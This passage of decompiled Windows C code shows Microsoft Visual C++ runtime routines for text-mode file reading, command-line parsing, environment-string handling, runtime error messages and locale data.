  puVar10 = (undefined4 *)register0x00000010;
  for (iVar7 = 0x400; puVar10 = puVar10 + 1, iVar7 != 0; iVar7 = iVar7 + -1) {
    *puVar10 = 0;
  }
  iVar7 = FUN_0041d8c0(in_stack_00001008,0x8000);
  while( true ) {
    uVar3 = 0x1000;
    if ((int)uVar9 < 0x1000) {
      uVar3 = uVar9;
    }
    iVar4 = FUN_00418b70(in_stack_00001008,&stack0x00000004,uVar3);
    if (iVar4 == -1) break;
    uVar9 = uVar9 - iVar4;
    if ((int)uVar9 < 1) {
LAB_0041aeba:
      FUN_0041d8c0(in_stack_00001008,iVar7);
      FUN_004190c0(in_stack_00001008,DVar1,0);
      return iVar8;
    }
  }
  pDVar5 = FUN_00419030();
  if (*pDVar5 == 5) {
    pDVar5 = FUN_00419020();
    *pDVar5 = 0xd;
  }
  iVar8 = -1;
  goto LAB_0041aeba;
}



/* VA 0041af50 */

int __cdecl FUN_0041af50(uint param_1,char *param_2,DWORD param_3)

{
  int *piVar1;
  char cVar2;
  byte bVar3;
  BOOL BVar4;
  undefined *puVar5;
  DWORD *pDVar6;
  int iVar7;
  int iVar8;
  char *pcVar9;
  DWORD DVar10;
  char *pcVar11;
  char *pcVar12;
  char local_9;
  DWORD local_8;
  int *local_4;

  iVar8 = 0;
  if (param_3 != 0) {
    piVar1 = &DAT_00430280 + ((int)param_1 >> 5);
    iVar7 = (param_1 & 0x1f) * 0x24;
    bVar3 = *(byte *)(iVar7 + 4 + (&DAT_00430280)[(int)param_1 >> 5]);
    if ((bVar3 & 2) == 0) {
      pcVar11 = param_2;
      if (((bVar3 & 0x48) != 0) &&
         (cVar2 = *(char *)(iVar7 + (&DAT_00430280)[(int)param_1 >> 5] + 5), cVar2 != '\n')) {
        *param_2 = cVar2;
        param_3 = param_3 - 1;
        pcVar11 = param_2 + 1;
        iVar8 = 1;
        *(undefined1 *)(iVar7 + 5 + *piVar1) = 10;
      }
      local_4 = piVar1;
      BVar4 = ReadFile(*(HANDLE *)(iVar7 + *piVar1),pcVar11,param_3,&local_8,(LPOVERLAPPED)0x0);
      if (BVar4 != 0) {
        iVar8 = iVar8 + local_8;
        bVar3 = *(byte *)(iVar7 + 4 + *piVar1);
        if ((bVar3 & 0x80) != 0) {
          if ((local_8 == 0) || (*param_2 != '\n')) {
            bVar3 = bVar3 & 0xfb;
          }
          else {
            bVar3 = bVar3 | 4;
          }
          *(byte *)(iVar7 + 4 + *piVar1) = bVar3;
          pcVar9 = param_2 + iVar8;
          pcVar11 = param_2;
          pcVar12 = param_2;
          if (param_2 < pcVar9) {
            while (cVar2 = *pcVar12, cVar2 != '\x1a') {
              if (cVar2 == '\r') {
                if (pcVar12 < pcVar9 + -1) {
                  if (pcVar12[1] == '\n') {
                    pcVar12 = pcVar12 + 2;
                    *pcVar11 = '\n';
                    goto LAB_0041b128;
                  }
                  *pcVar11 = '\r';
                  pcVar11 = pcVar11 + 1;
                  pcVar12 = pcVar12 + 1;
                }
                else {
                  DVar10 = 0;
                  pcVar12 = pcVar12 + 1;
                  BVar4 = ReadFile(*(HANDLE *)(iVar7 + *local_4),&local_9,1,&local_8,
                                   (LPOVERLAPPED)0x0);
                  if (BVar4 == 0) {
                    DVar10 = GetLastError();
                  }
                  if ((DVar10 == 0) && (local_8 != 0)) {
                    if ((*(byte *)(iVar7 + 4 + *local_4) & 0x48) == 0) {
                      if ((pcVar11 == param_2) && (local_9 == '\n')) {
                        *pcVar11 = '\n';
                        goto LAB_0041b128;
                      }
                      FUN_004190c0(param_1,-1,1);
                      if (local_9 != '\n') goto LAB_0041b125;
                    }
                    else {
                      if (local_9 == '\n') {
                        *pcVar11 = '\n';
                        goto LAB_0041b128;
                      }
                      *pcVar11 = '\r';
                      pcVar11 = pcVar11 + 1;
                      *(char *)(iVar7 + 5 + *local_4) = local_9;
                    }
                  }
                  else {
LAB_0041b125:
                    *pcVar11 = '\r';
LAB_0041b128:
                    pcVar11 = pcVar11 + 1;
                  }
                }
              }
              else {
                *pcVar11 = cVar2;
                pcVar11 = pcVar11 + 1;
                pcVar12 = pcVar12 + 1;
              }
              if (pcVar9 <= pcVar12) {
                return (int)pcVar11 - (int)param_2;
              }
            }
            bVar3 = *(byte *)(iVar7 + 4 + *local_4);
            if ((bVar3 & 0x40) == 0) {
              *(byte *)(iVar7 + 4 + *local_4) = bVar3 | 2;
            }
          }
          iVar8 = (int)pcVar11 - (int)param_2;
        }
        return iVar8;
      }
      puVar5 = (undefined *)GetLastError();
      if (puVar5 == (undefined *)0x5) {
        pDVar6 = FUN_00419020();
        *pDVar6 = 9;
        pDVar6 = FUN_00419030();
        *pDVar6 = 5;
        return -1;
      }
      if (puVar5 != (undefined *)0x6d) {
        FUN_00418fa0(puVar5);
        return -1;
      }
    }
  }
  return 0;
}



/* VA 0041b3d0 */

void __cdecl FUN_0041b3d0(uint param_1)

{
  FUN_0041b3f0(param_1,0,4);
  return;
}



/* VA 0041b3f0 */

undefined4 __cdecl FUN_0041b3f0(uint param_1,uint param_2,byte param_3)

{
  uint uVar1;

  if ((*(byte *)((int)&DAT_0042ee60 + (param_1 & 0xff) + 1) & param_3) == 0) {
    if (param_2 == 0) {
      uVar1 = 0;
    }
    else {
      uVar1 = *(ushort *)(&DAT_0042abca + (param_1 & 0xff) * 2) & param_2;
    }
    if (uVar1 == 0) {
      return 0;
    }
  }
  return 1;
}



/* VA 0041b430 */

void FUN_0041b430(void)

{
  char cVar1;
  char cVar2;
  int *piVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  char *pcVar7;
  int iVar8;
  char *pcVar9;
  char *pcVar10;
  int *local_4;

  iVar8 = 0;
  cVar2 = *DAT_0042ecc4;
  pcVar7 = DAT_0042ecc4;
  while (cVar2 != '\0') {
    if (cVar2 != '=') {
      iVar8 = iVar8 + 1;
    }
    uVar4 = 0xffffffff;
    pcVar9 = pcVar7;
    do {
      if (uVar4 == 0) break;
      uVar4 = uVar4 - 1;
      cVar2 = *pcVar9;
      pcVar9 = pcVar9 + 1;
    } while (cVar2 != '\0');
    pcVar9 = pcVar7 + ~uVar4;
    pcVar7 = pcVar7 + ~uVar4;
    cVar2 = *pcVar9;
  }
  piVar3 = (int *)FUN_00414db0(iVar8 * 4 + 4);
  DAT_0042ec80 = piVar3;
  if (piVar3 == (int *)0x0) {
    __amsg_exit(9);
  }
  cVar2 = *DAT_0042ecc4;
  local_4 = piVar3;
  pcVar7 = DAT_0042ecc4;
  do {
    if (cVar2 == '\0') {
      FUN_00414d40(DAT_0042ecc4);
      DAT_0042ecc4 = (char *)0x0;
      *piVar3 = 0;
      return;
    }
    uVar4 = 0xffffffff;
    pcVar9 = pcVar7;
    do {
      if (uVar4 == 0) break;
      uVar4 = uVar4 - 1;
      cVar1 = *pcVar9;
      pcVar9 = pcVar9 + 1;
    } while (cVar1 != '\0');
    uVar4 = ~uVar4;
    if (cVar2 != '=') {
      iVar8 = FUN_00414db0(uVar4);
      *piVar3 = iVar8;
      if (iVar8 == 0) {
        __amsg_exit(9);
      }
      uVar5 = 0xffffffff;
      pcVar9 = pcVar7;
      do {
        pcVar10 = pcVar9;
        if (uVar5 == 0) break;
        uVar5 = uVar5 - 1;
        pcVar10 = pcVar9 + 1;
        cVar2 = *pcVar9;
        pcVar9 = pcVar10;
      } while (cVar2 != '\0');
      uVar5 = ~uVar5;
      pcVar9 = pcVar10 + -uVar5;
      pcVar10 = (char *)*local_4;
      for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
        *(undefined4 *)pcVar10 = *(undefined4 *)pcVar9;
        pcVar9 = pcVar9 + 4;
        pcVar10 = pcVar10 + 4;
      }
      piVar3 = local_4 + 1;
      for (uVar5 = uVar5 & 3; local_4 = piVar3, uVar5 != 0; uVar5 = uVar5 - 1) {
        *pcVar10 = *pcVar9;
        pcVar9 = pcVar9 + 1;
        pcVar10 = pcVar10 + 1;
      }
    }
    cVar2 = pcVar7[uVar4];
    pcVar7 = pcVar7 + uVar4;
  } while( true );
}



/* VA 0041b520 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_0041b520(void)

{
  undefined4 *puVar1;
  byte *pbVar2;
  int local_8;
  int local_4;

  GetModuleFileNameA((HMODULE)0x0,&DAT_0042ef88,0x104);
  _DAT_0042ec90 = &DAT_0042ef88;
  pbVar2 = DAT_004313b0;
  if (*DAT_004313b0 == 0) {
    pbVar2 = &DAT_0042ef88;
  }
  FUN_0041b5c0(pbVar2,(undefined4 *)0x0,(byte *)0x0,&local_8,&local_4);
  puVar1 = (undefined4 *)FUN_00414db0(local_4 + local_8 * 4);
  if (puVar1 == (undefined4 *)0x0) {
    __amsg_exit(8);
  }
  FUN_0041b5c0(pbVar2,puVar1,(byte *)(puVar1 + local_8),&local_8,&local_4);
  _DAT_0042ec78 = puVar1;
  _DAT_0042ec74 = local_8 + -1;
  return;
}



/* VA 0041b5c0 */

void __cdecl FUN_0041b5c0(byte *param_1,undefined4 *param_2,byte *param_3,int *param_4,int *param_5)

{
  byte *pbVar1;
  byte bVar2;
  bool bVar3;
  bool bVar4;
  bool bVar5;
  int *piVar6;
  byte *pbVar7;
  uint uVar8;

  piVar6 = param_5;
  *param_5 = 0;
  *param_4 = 1;
  if (param_2 != (undefined4 *)0x0) {
    *param_2 = param_3;
    param_2 = param_2 + 1;
  }
  if (*param_1 == 0x22) {
    bVar2 = param_1[1];
    while ((pbVar7 = param_1 + 1, bVar2 != 0x22 && (bVar2 != 0))) {
      if (((*(byte *)((int)&DAT_0042ee60 + bVar2 + 1) & 4) != 0) &&
         (*param_5 = *param_5 + 1, param_3 != (byte *)0x0)) {
        *param_3 = *pbVar7;
        param_3 = param_3 + 1;
        pbVar7 = param_1 + 2;
      }
      *param_5 = *param_5 + 1;
      if (param_3 != (byte *)0x0) {
        *param_3 = *pbVar7;
        param_3 = param_3 + 1;
      }
      param_1 = pbVar7;
      bVar2 = pbVar7[1];
    }
    *param_5 = *param_5 + 1;
    if (param_3 != (byte *)0x0) {
      *param_3 = 0;
      param_3 = param_3 + 1;
    }
    if (*pbVar7 == 0x22) {
      pbVar7 = param_1 + 2;
    }
  }
  else {
    do {
      *piVar6 = *piVar6 + 1;
      if (param_3 != (byte *)0x0) {
        *param_3 = *param_1;
        param_3 = param_3 + 1;
      }
      bVar2 = *param_1;
      pbVar7 = param_1 + 1;
      param_5 = (int *)(uint)bVar2;
      if ((*(byte *)((int)param_5 + 0x42ee61) & 4) != 0) {
        *piVar6 = *piVar6 + 1;
        if (param_3 != (byte *)0x0) {
          *param_3 = *pbVar7;
          param_3 = param_3 + 1;
        }
        pbVar7 = param_1 + 2;
      }
      if (bVar2 == 0x20) break;
      if (bVar2 == 0) goto LAB_0041b699;
      param_1 = pbVar7;
    } while (bVar2 != 9);
    if (bVar2 == 0) {
LAB_0041b699:
      pbVar7 = pbVar7 + -1;
    }
    else if (param_3 != (byte *)0x0) {
      param_3[-1] = 0;
    }
  }
  bVar4 = false;
  bVar5 = false;
  while (*pbVar7 != 0) {
    for (; (*pbVar7 == 0x20 || (*pbVar7 == 9)); pbVar7 = pbVar7 + 1) {
    }
    if (*pbVar7 == 0) break;
    if (param_2 != (undefined4 *)0x0) {
      *param_2 = param_3;
      param_2 = param_2 + 1;
    }
    *param_4 = *param_4 + 1;
    while( true ) {
      uVar8 = 0;
      bVar3 = true;
      bVar2 = *pbVar7;
      while (bVar2 == 0x5c) {
        pbVar1 = pbVar7 + 1;
        pbVar7 = pbVar7 + 1;
        uVar8 = uVar8 + 1;
        bVar2 = *pbVar1;
      }
      if (*pbVar7 == 0x22) {
        if ((uVar8 & 1) == 0) {
          if ((bVar4) && (pbVar7[1] == 0x22)) {
            pbVar7 = pbVar7 + 1;
          }
          else {
            bVar3 = false;
          }
          bVar4 = !bVar5;
          bVar5 = bVar4;
        }
        uVar8 = uVar8 >> 1;
      }
      for (; uVar8 != 0; uVar8 = uVar8 - 1) {
        if (param_3 != (byte *)0x0) {
          *param_3 = 0x5c;
          param_3 = param_3 + 1;
        }
        *piVar6 = *piVar6 + 1;
      }
      bVar2 = *pbVar7;
      if ((bVar2 == 0) || ((!bVar4 && ((bVar2 == 0x20 || (bVar2 == 9)))))) break;
      if (bVar3) {
        if (param_3 == (byte *)0x0) {
          if ((*(byte *)((int)&DAT_0042ee60 + bVar2 + 1) & 4) != 0) {
            pbVar7 = pbVar7 + 1;
            *piVar6 = *piVar6 + 1;
          }
          *piVar6 = *piVar6 + 1;
          goto LAB_0041b795;
        }
        if ((*(byte *)((int)&DAT_0042ee60 + bVar2 + 1) & 4) != 0) {
          *param_3 = bVar2;
          param_3 = param_3 + 1;
          pbVar7 = pbVar7 + 1;
          *piVar6 = *piVar6 + 1;
        }
        *param_3 = *pbVar7;
        param_3 = param_3 + 1;
        *piVar6 = *piVar6 + 1;
        pbVar7 = pbVar7 + 1;
      }
      else {
LAB_0041b795:
        pbVar7 = pbVar7 + 1;
      }
    }
    if (param_3 != (byte *)0x0) {
      *param_3 = 0;
      param_3 = param_3 + 1;
    }
    *piVar6 = *piVar6 + 1;
  }
  if (param_2 != (undefined4 *)0x0) {
    *param_2 = 0;
  }
  *param_4 = *param_4 + 1;
  return;
}



/* VA 0041b7d0 */

LPSTR FUN_0041b7d0(void)

{
  char cVar1;
  WCHAR WVar2;
  WCHAR *pWVar3;
  int iVar5;
  uint uVar6;
  LPSTR pCVar7;
  LPCH pCVar8;
  LPCH pCVar9;
  LPCH pCVar10;
  LPWCH lpWideCharStr;
  CHAR *pCVar11;
  LPSTR pCVar12;
  WCHAR *pWVar4;

  lpWideCharStr = (LPWCH)0x0;
  pCVar10 = (LPCH)0x0;
  if (DAT_0042f090 == 0) {
    lpWideCharStr = GetEnvironmentStringsW();
    if (lpWideCharStr == (LPWCH)0x0) {
      pCVar10 = GetEnvironmentStrings();
      if (pCVar10 == (LPCH)0x0) {
        return (LPSTR)0x0;
      }
      DAT_0042f090 = 2;
    }
    else {
      DAT_0042f090 = 1;
    }
  }
  if (DAT_0042f090 == 1) {
    if ((lpWideCharStr != (LPWCH)0x0) ||
       (lpWideCharStr = GetEnvironmentStringsW(), lpWideCharStr != (LPWCH)0x0)) {
      WVar2 = *lpWideCharStr;
      pWVar3 = lpWideCharStr;
      while (WVar2 != L'\0') {
        do {
          pWVar4 = pWVar3;
          pWVar3 = pWVar4 + 1;
        } while (*pWVar3 != L'\0');
        pWVar3 = pWVar4 + 2;
        WVar2 = *pWVar3;
      }
      iVar5 = ((int)pWVar3 - (int)lpWideCharStr >> 1) + 1;
      uVar6 = WideCharToMultiByte(0,0,lpWideCharStr,iVar5,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0);
      if ((uVar6 != 0) && (pCVar7 = (LPSTR)FUN_00414db0(uVar6), pCVar7 != (LPSTR)0x0)) {
        iVar5 = WideCharToMultiByte(0,0,lpWideCharStr,iVar5,pCVar7,uVar6,(LPCSTR)0x0,(LPBOOL)0x0);
        if (iVar5 == 0) {
          FUN_00414d40(pCVar7);
          pCVar7 = (LPSTR)0x0;
        }
        FreeEnvironmentStringsW(lpWideCharStr);
        return pCVar7;
      }
      FreeEnvironmentStringsW(lpWideCharStr);
      return (LPSTR)0x0;
    }
  }
  else if ((DAT_0042f090 == 2) &&
          ((pCVar10 != (LPCH)0x0 || (pCVar10 = GetEnvironmentStrings(), pCVar10 != (LPCH)0x0)))) {
    cVar1 = *pCVar10;
    pCVar9 = pCVar10;
    while (cVar1 != '\0') {
      do {
        pCVar8 = pCVar9;
        pCVar9 = pCVar8 + 1;
      } while (pCVar8[1] != '\0');
      pCVar9 = pCVar8 + 2;
      cVar1 = pCVar8[2];
    }
    pCVar9 = pCVar9 + (1 - (int)pCVar10);
    pCVar7 = (LPSTR)FUN_00414db0((uint)pCVar9);
    if (pCVar7 != (LPSTR)0x0) {
      pCVar11 = pCVar10;
      pCVar12 = pCVar7;
      for (uVar6 = (uint)pCVar9 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
        *(undefined4 *)pCVar12 = *(undefined4 *)pCVar11;
        pCVar11 = pCVar11 + 4;
        pCVar12 = pCVar12 + 4;
      }
      for (uVar6 = (uint)pCVar9 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {
        *pCVar12 = *pCVar11;
        pCVar11 = pCVar11 + 1;
        pCVar12 = pCVar12 + 1;
      }
      FreeEnvironmentStringsA(pCVar10);
      return pCVar7;
    }
    FreeEnvironmentStringsA(pCVar10);
    return (LPSTR)0x0;
  }
  return (LPSTR)0x0;
}



/* VA 0041b930 */

void FUN_0041b930(void)

{
  if ((DAT_0042eccc == 1) || ((DAT_0042eccc == 0 && (DAT_0042ade4 == 1)))) {
    FUN_0041b970(0xfc);
    if (DAT_0042f094 != (code *)0x0) {
      (*DAT_0042f094)();
    }
    FUN_0041b970(0xff);
  }
  return;
}



/* VA 0041b970 */

void __cdecl FUN_0041b970(int param_1)

{
  char cVar1;
  int *piVar2;
  DWORD DVar3;
  HANDLE hFile;
  int iVar4;
  uint uVar5;
  uint uVar6;
  char *pcVar7;
  int iVar8;
  char *pcVar9;
  CHAR *pCVar10;
  char *pcVar11;
  DWORD local_1a8;
  char local_1a4 [100];
  char acStack_140 [60];
  CHAR local_104 [260];

  piVar2 = &DAT_0042d6a8;
  iVar8 = 0;
  do {
    if (param_1 == *piVar2) break;
    piVar2 = piVar2 + 2;
    iVar8 = iVar8 + 1;
  } while (piVar2 < &DAT_0042d738);
  if (param_1 == (&DAT_0042d6a8)[iVar8 * 2]) {
    if ((DAT_0042eccc == 1) || ((DAT_0042eccc == 0 && (DAT_0042ade4 == 1)))) {
      if ((DAT_00430280 == 0) ||
         (hFile = *(HANDLE *)(DAT_00430280 + 0x48), hFile == (HANDLE)0xffffffff)) {
        hFile = GetStdHandle(0xfffffff4);
      }
      pcVar7 = *(char **)(iVar8 * 8 + 0x42d6ac);
      uVar5 = 0xffffffff;
      pcVar9 = pcVar7;
      do {
        if (uVar5 == 0) break;
        uVar5 = uVar5 - 1;
        cVar1 = *pcVar9;
        pcVar9 = pcVar9 + 1;
      } while (cVar1 != '\0');
      WriteFile(hFile,pcVar7,~uVar5 - 1,&local_1a8,(LPOVERLAPPED)0x0);
    }
    else if (param_1 != 0xfc) {
      DVar3 = GetModuleFileNameA((HMODULE)0x0,local_104,0x104);
      if (DVar3 == 0) {
        pcVar7 = "<program name unknown>";
        pCVar10 = local_104;
        for (iVar4 = 5; iVar4 != 0; iVar4 = iVar4 + -1) {
          *(undefined4 *)pCVar10 = *(undefined4 *)pcVar7;
          pcVar7 = pcVar7 + 4;
          pCVar10 = pCVar10 + 4;
        }
        *(undefined2 *)pCVar10 = *(undefined2 *)pcVar7;
        pCVar10[2] = pcVar7[2];
      }
      uVar5 = 0xffffffff;
      pcVar7 = local_104;
      pcVar9 = local_104;
      do {
        if (uVar5 == 0) break;
        uVar5 = uVar5 - 1;
        cVar1 = *pcVar9;
        pcVar9 = pcVar9 + 1;
      } while (cVar1 != '\0');
      if (0x3c < ~uVar5) {
        uVar5 = 0xffffffff;
        pcVar7 = local_104;
        do {
          if (uVar5 == 0) break;
          uVar5 = uVar5 - 1;
          cVar1 = *pcVar7;
          pcVar7 = pcVar7 + 1;
        } while (cVar1 != '\0');
        pcVar7 = acStack_140 + ~uVar5;
        _strncpy(pcVar7,"...",3);
      }
      pcVar9 = "Runtime Error!\n\nProgram: ";
      pcVar11 = local_1a4;
      for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {
        *(undefined4 *)pcVar11 = *(undefined4 *)pcVar9;
        pcVar9 = pcVar9 + 4;
        pcVar11 = pcVar11 + 4;
      }
      *(undefined2 *)pcVar11 = *(undefined2 *)pcVar9;
      uVar5 = 0xffffffff;
      do {
        pcVar9 = pcVar7;
        if (uVar5 == 0) break;
        uVar5 = uVar5 - 1;
        pcVar9 = pcVar7 + 1;
        cVar1 = *pcVar7;
        pcVar7 = pcVar9;
      } while (cVar1 != '\0');
      uVar5 = ~uVar5;
      iVar4 = -1;
      pcVar7 = local_1a4;
      do {
        pcVar11 = pcVar7;
        if (iVar4 == 0) break;
        iVar4 = iVar4 + -1;
        pcVar11 = pcVar7 + 1;
        cVar1 = *pcVar7;
        pcVar7 = pcVar11;
      } while (cVar1 != '\0');
      pcVar7 = pcVar9 + -uVar5;
      pcVar9 = pcVar11 + -1;
      for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
        *(undefined4 *)pcVar9 = *(undefined4 *)pcVar7;
        pcVar7 = pcVar7 + 4;
        pcVar9 = pcVar9 + 4;
      }
      for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
        *pcVar9 = *pcVar7;
        pcVar7 = pcVar7 + 1;
        pcVar9 = pcVar9 + 1;
      }
      uVar5 = 0xffffffff;
      pcVar7 = "\n\n";
      do {
        pcVar9 = pcVar7;
        if (uVar5 == 0) break;
        uVar5 = uVar5 - 1;
        pcVar9 = pcVar7 + 1;
        cVar1 = *pcVar7;
        pcVar7 = pcVar9;
      } while (cVar1 != '\0');
      uVar5 = ~uVar5;
      iVar4 = -1;
      pcVar7 = local_1a4;
      do {
        pcVar11 = pcVar7;
        if (iVar4 == 0) break;
        iVar4 = iVar4 + -1;
        pcVar11 = pcVar7 + 1;
        cVar1 = *pcVar7;
        pcVar7 = pcVar11;
      } while (cVar1 != '\0');
      pcVar7 = pcVar9 + -uVar5;
      pcVar9 = pcVar11 + -1;
      for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
        *(undefined4 *)pcVar9 = *(undefined4 *)pcVar7;
        pcVar7 = pcVar7 + 4;
        pcVar9 = pcVar9 + 4;
      }
      for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
        *pcVar9 = *pcVar7;
        pcVar7 = pcVar7 + 1;
        pcVar9 = pcVar9 + 1;
      }
      uVar5 = 0xffffffff;
      pcVar7 = *(char **)(iVar8 * 8 + 0x42d6ac);
      do {
        pcVar9 = pcVar7;
        if (uVar5 == 0) break;
        uVar5 = uVar5 - 1;
        pcVar9 = pcVar7 + 1;
        cVar1 = *pcVar7;
        pcVar7 = pcVar9;
      } while (cVar1 != '\0');
      uVar5 = ~uVar5;
      iVar8 = -1;
      pcVar7 = local_1a4;
      do {
        pcVar11 = pcVar7;
        if (iVar8 == 0) break;
        iVar8 = iVar8 + -1;
        pcVar11 = pcVar7 + 1;
        cVar1 = *pcVar7;
        pcVar7 = pcVar11;
      } while (cVar1 != '\0');
      pcVar7 = pcVar9 + -uVar5;
      pcVar9 = pcVar11 + -1;
      for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
        *(undefined4 *)pcVar9 = *(undefined4 *)pcVar7;
        pcVar7 = pcVar7 + 4;
        pcVar9 = pcVar9 + 4;
      }
      for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
        *pcVar9 = *pcVar7;
        pcVar7 = pcVar7 + 1;
        pcVar9 = pcVar9 + 1;
      }
      FUN_0041d930(local_1a4,"Microsoft Visual C++ Runtime Library",0x12010);
      return;
    }
  }
  return;
}



/* VA 0041bc00 */

uint __cdecl FUN_0041bc00(char *param_1)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint uVar14;
  uint uVar15;
  uint uVar16;
  uint uVar17;
  uint uVar18;
  uint uVar19;
  uint uVar20;
  uint uVar21;
  uint uVar22;
  uint uVar23;
  uint uVar24;
  uint uVar25;
  uint uVar26;
  uint uVar27;
  uint uVar28;
  uint uVar29;
  uint uVar30;
  uint uVar31;
  uint uVar32;
  uint uVar33;
  uint uVar34;
  uint uVar35;
  uint uVar36;
  uint uVar37;
  uint uVar38;
  uint uVar39;
  uint uVar40;
  uint uVar41;
  uint uVar42;
  uint uVar43;
  char *pcVar44;

  uVar40 = (uint)DAT_0042f0d6;
  pcVar44 = (char *)(uint)DAT_0042f0d8;
  if (param_1 == (char *)0x0) {
    return 0xffffffff;
  }
  uVar1 = FUN_0041d9c0(1,uVar40,0x31,param_1 + 4);
  uVar2 = FUN_0041d9c0(1,uVar40,0x32,param_1 + 8);
  uVar3 = FUN_0041d9c0(1,uVar40,0x33,param_1 + 0xc);
  uVar4 = FUN_0041d9c0(1,uVar40,0x34,param_1 + 0x10);
  uVar5 = FUN_0041d9c0(1,uVar40,0x35,param_1 + 0x14);
  uVar6 = FUN_0041d9c0(1,uVar40,0x36,param_1 + 0x18);
  uVar7 = FUN_0041d9c0(1,uVar40,0x37,param_1);
  uVar8 = FUN_0041d9c0(1,uVar40,0x2a,param_1 + 0x20);
  uVar9 = FUN_0041d9c0(1,uVar40,0x2b,param_1 + 0x24);
  uVar10 = FUN_0041d9c0(1,uVar40,0x2c,param_1 + 0x28);
  uVar11 = FUN_0041d9c0(1,uVar40,0x2d,param_1 + 0x2c);
  uVar12 = FUN_0041d9c0(1,uVar40,0x2e,param_1 + 0x30);
  uVar13 = FUN_0041d9c0(1,uVar40,0x2f,param_1 + 0x34);
  uVar14 = FUN_0041d9c0(1,uVar40,0x30,param_1 + 0x1c);
  uVar15 = FUN_0041d9c0(1,uVar40,0x44,param_1 + 0x38);
  uVar16 = FUN_0041d9c0(1,uVar40,0x45,param_1 + 0x3c);
  uVar17 = FUN_0041d9c0(1,uVar40,0x46,param_1 + 0x40);
  uVar18 = FUN_0041d9c0(1,uVar40,0x47,param_1 + 0x44);
  uVar19 = FUN_0041d9c0(1,uVar40,0x48,param_1 + 0x48);
  uVar20 = FUN_0041d9c0(1,uVar40,0x49,param_1 + 0x4c);
  uVar21 = FUN_0041d9c0(1,uVar40,0x4a,param_1 + 0x50);
  uVar22 = FUN_0041d9c0(1,uVar40,0x4b,param_1 + 0x54);
  uVar23 = FUN_0041d9c0(1,uVar40,0x4c,param_1 + 0x58);
  uVar24 = FUN_0041d9c0(1,uVar40,0x4d,param_1 + 0x5c);
  uVar25 = FUN_0041d9c0(1,uVar40,0x4e,param_1 + 0x60);
  uVar26 = FUN_0041d9c0(1,uVar40,0x4f,param_1 + 100);
  uVar27 = FUN_0041d9c0(1,uVar40,0x38,param_1 + 0x68);
  uVar28 = FUN_0041d9c0(1,uVar40,0x39,param_1 + 0x6c);
  uVar29 = FUN_0041d9c0(1,uVar40,0x3a,param_1 + 0x70);
  uVar30 = FUN_0041d9c0(1,uVar40,0x3b,param_1 + 0x74);
  uVar31 = FUN_0041d9c0(1,uVar40,0x3c,param_1 + 0x78);
  uVar32 = FUN_0041d9c0(1,uVar40,0x3d,param_1 + 0x7c);
  uVar33 = FUN_0041d9c0(1,uVar40,0x3e,param_1 + 0x80);
  uVar34 = FUN_0041d9c0(1,uVar40,0x3f,param_1 + 0x84);
  uVar35 = FUN_0041d9c0(1,uVar40,0x40,param_1 + 0x88);
  uVar36 = FUN_0041d9c0(1,uVar40,0x41,param_1 + 0x8c);
  uVar37 = FUN_0041d9c0(1,uVar40,0x42,param_1 + 0x90);
  uVar38 = FUN_0041d9c0(1,uVar40,0x43,param_1 + 0x94);
  uVar39 = FUN_0041d9c0(1,uVar40,0x28,param_1 + 0x98);
  uVar40 = FUN_0041d9c0(1,uVar40,0x29,param_1 + 0x9c);
  uVar41 = FUN_0041d9c0(1,(LCID)pcVar44,0x1f,param_1 + 0xa0);
  uVar42 = FUN_0041d9c0(1,(LCID)pcVar44,0x20,param_1 + 0xa4);
  uVar43 = FUN_0041c1c0(pcVar44,(int)param_1);
  return uVar1 | uVar2 | uVar3 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 |
         uVar12 | uVar13 | uVar14 | uVar15 | uVar16 | uVar17 | uVar18 | uVar19 | uVar20 | uVar21 |
         uVar22 | uVar23 | uVar24 | uVar25 | uVar26 | uVar27 | uVar28 | uVar29 | uVar30 | uVar31 |
         uVar32 | uVar33 | uVar34 | uVar35 | uVar36 | uVar37 | uVar38 | uVar39 | uVar40 | uVar41 |
         uVar42 | uVar43;
}



/* VA 0041bf80 */

void __cdecl FUN_0041bf80(undefined4 *param_1)

{
  if (param_1 != (undefined4 *)0x0) {
    FUN_00414d40((undefined *)param_1[1]);
    FUN_00414d40((undefined *)param_1[2]);
    FUN_00414d40((undefined *)param_1[3]);
    FUN_00414d40((undefined *)param_1[4]);
    FUN_00414d40((undefined *)param_1[5]);
    FUN_00414d40((undefined *)param_1[6]);
    FUN_00414d40((undefined *)*param_1);
    FUN_00414d40((undefined *)param_1[8]);
    FUN_00414d40((undefined *)param_1[9]);
    FUN_00414d40((undefined *)param_1[10]);
    FUN_00414d40((undefined *)param_1[0xb]);
    FUN_00414d40((undefined *)param_1[0xc]);
    FUN_00414d40((undefined *)param_1[0xd]);
    FUN_00414d40((undefined *)param_1[7]);
    FUN_00414d40((undefined *)param_1[0xe]);
    FUN_00414d40((undefined *)param_1[0xf]);
    FUN_00414d40((undefined *)param_1[0x10]);
    FUN_00414d40((undefined *)param_1[0x11]);
    FUN_00414d40((undefined *)param_1[0x12]);
    FUN_00414d40((undefined *)param_1[0x13]);
    FUN_00414d40((undefined *)param_1[0x14]);
    FUN_00414d40((undefined *)param_1[0x15]);
    FUN_00414d40((undefined *)param_1[0x16]);
    FUN_00414d40((undefined *)param_1[0x17]);
    FUN_00414d40((undefined *)param_1[0x18]);
    FUN_00414d40((undefined *)param_1[0x19]);
    FUN_00414d40((undefined *)param_1[0x1a]);
